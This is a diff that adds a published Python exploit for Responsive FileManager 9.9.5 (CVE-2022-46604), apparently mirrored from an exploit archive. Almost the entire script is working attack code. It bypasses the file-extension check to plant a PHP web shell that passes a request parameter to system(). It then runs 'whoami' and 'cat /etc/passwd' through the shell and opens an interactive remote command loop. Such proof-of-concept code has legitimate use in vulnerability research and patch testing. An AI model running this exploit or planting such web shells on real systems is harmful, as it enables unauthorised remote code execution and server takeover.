@@ -1,0 +1,165 @@
+id: 38486
+date: 04/05/2023
+title: Responsive FileManager 9.9.5 - Remote Code Execution Exploit
+author: Galoget Latorre
+cves: CVE-2022-46604
+
+# Exploit Title: Responsive FileManager 9.9.5 - Remote Code Execution (RCE)
+# Exploit Author: Galoget Latorre (@galoget)
+# Vendor Homepage: https://responsivefilemanager.com
+# Software Link: https://github.com/trippo/ResponsiveFilemanager/releases/download/v9.9.5/responsive_filemanager.zip
+# Dockerfile: https://github.com/galoget/ResponsiveFileManager-CVE-2022-46604
+# Version: 9.9.5
+# Language: Python 3.x
+# Tested on:
+#  - Ubuntu 22.04.5 LTS 64-bit
+#  - Debian GNU/Linux 10 (buster) 64-bit
+#  - Kali GNU/Linux 2022.3 64-bit
+# CVE: CVE-2022-46604 (Konstantin Burov)
+
+
+#!/usr/bin/python3
+# -*- coding:utf-8 -*-
+
+import sys
+import requests
+from bs4 import BeautifulSoup
+from termcolor import colored, cprint
+
+
+# Usage: python3 exploit.py <target.site>
+# Example: python3 exploit.py 127.0.0.1
+
+
+def banner():
+    """
+    Function to print the banner
+    """
+
+    banner_text = """
+ _____ _____ _____           ___ ___ ___ ___           ___ ___ ___ ___ ___ 
+|     |  |  |   __|   ___   |_  |   |_  |_  |   ___   | | |  _|  _|   | | |
+|   --|  |  |   __|  |___|  |  _| | |  _|  _|  |___|  |_  | . | . | | |_  |
+|_____|\\___/|_____|         |___|___|___|___|           |_|___|___|___| |_|
+                                                               
+File Creation Extension Bypass in Responsive FileManager ≤ 9.9.5 (RCE)
+Exploit Author: Galoget Latorre (@galoget)
+CVE Author: Konstantin Burov
+"""
+    print(banner_text)
+
+
+def usage_instructions():
+    """
+    Function that validates the number of arguments.
+    The aplication MUST have 2 arguments:
+    - [0]: Name of the script
+    - [1]: Target site, which can be a domain or an IP Address
+    """
+    if len(sys.argv) != 2:
+        print("Usage: python3 exploit.py <target.site>")
+        print("Example: python3 exploit.py 127.0.0.1")
+        sys.exit(0)
+
+
+def run_command(web_session, webshell_url, command_to_run):
+    """
+    Function that:
+      - Interacts with the webshell to run a command
+      - Cleans the response of the webshell
+      - Returns the response object and the output of the command
+    """
+    webshell_response = web_session.get(url = webshell_url + f"?cmd={command_to_run}", headers = headers)
+    command_output_soup = BeautifulSoup(webshell_response.text, 'html.parser')
+    return (webshell_response, command_output_soup.find('pre').text)
+
+
+if __name__ == "__main__":
+    banner()
+    usage_instructions()
+
+    # Change this with the domain or IP address to attack
+    if sys.argv[1]:
+        host = sys.argv[1]
+    else:
+        host = "127.0.0.1"
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
+    }
+
+
+    # URL to create a new file
+    target_url = f"http://{host}/filemanager/execute.php?action=create_file"
+
+    # Change this to customize the payload (i.e. The content of the malicious file that will be created)
+    payload = "<html><body><form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><pre><?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?></pre></body></html>"
+    # oneliner_payload = " <?=`$_GET[_]`?>"
+
+    # URL to get a PHPSESSID value
+    cookie_url = f"http://{host}/filemanager/dialog.php"
+
+    # New Session
+    session = requests.Session()
+
+    # GET request to retrieve a PHPSESSID value
+    cprint(f"[*] Trying to get a PHPSESSID at {host}", "blue")
+    try:
+        session.get(url = cookie_url, headers = headers)
+    except:
+        cprint(f"[-] Something went wrong when trying to connect to '{host}'.", "red")
+        sys.exit(0)
+
+    if session.cookies.get_dict():
+        cprint("[+] PHPSESSID retrieved correctly.", "green")
+        cprint(f"[!] PHPSESSID: {session.cookies.get_dict()['PHPSESSID']}", "yellow")
+    else:
+        cprint("[-] Something went wrong when trying to get a PHPSESSID.", "red")
+
+    # Params, rename if you want
+    params = {"path": "shell.php", "path_thumb": "../thumbs/shell.php", "name": "shell.txt", "new_content": payload}
+
+    # POST request to create the webshell
+    cprint(f"\n[*] Attempting to create a webshell on {host}", "blue")
+    response = session.post(url = target_url, headers = headers, data = params)
+
+    # If the status code and the message match, we may have a webshell inside. ;)
+    if response.status_code == 200 and response.text == "File successfully saved.":
+        # Default webshell path
+        shell_url = f"http://{host}/source/shell.php"
+
+        # Verify if the shell was uploaded by running whoami and cat /etc/passwd
+        webshell, whoami_output = run_command(session, shell_url, "whoami")
+        webshell, passwd_output = run_command(session, shell_url, "cat /etc/passwd")
+
+        # Common users when getting a webshell
+        common_users = ["www-data", "apache", "nobody", "apache2", "root", "administrator", "admin"]
+
+        # Verify if the command was executed correctly
+        if webshell.status_code == 200 or whoami_output.lower() in common_users or "root:x::" in passwd_output:
+            cprint("[+] Webshell uploaded - Enjoy!", "green")
+            cprint(f"[!] Webshell available at '{shell_url}' - Enjoy!", "yellow")
+            cprint(f"[+] Running `whoami` command: {whoami_output}", "green")
+
+
+        # Ask to enter into a pseudo-interactive mode with the webshell
+        answer = input(colored("Do you want to enter into interactive mode with the webshell? (Y/N): ", "magenta"))
+
+        if answer.upper() == "Y":
+            cprint("\n[*] Entering into interactive mode, write 'exit' to quit.\n", "blue")
+            command = ""
+            while command != "exit":
+                command = input(colored(">> ", "cyan")).lower()
+                webshell, command_output = run_command(session, shell_url, command)
+                if command != "exit":
+                    cprint(command_output, "cyan")
+
+        cprint("\n[*] Exiting...Bye!", "blue")
+
+    elif response.status_code == 403 and response.text == "The file is already existing":
+        cprint("[-] The file that you're trying to create is already on the server.", "red")
+
+    else:
+        cprint(f"[-] The server returned Status Code: '{response.status_code}' and this text: '{response.text}'", "red")
+
+#  0day.today [2023-04-19]  #
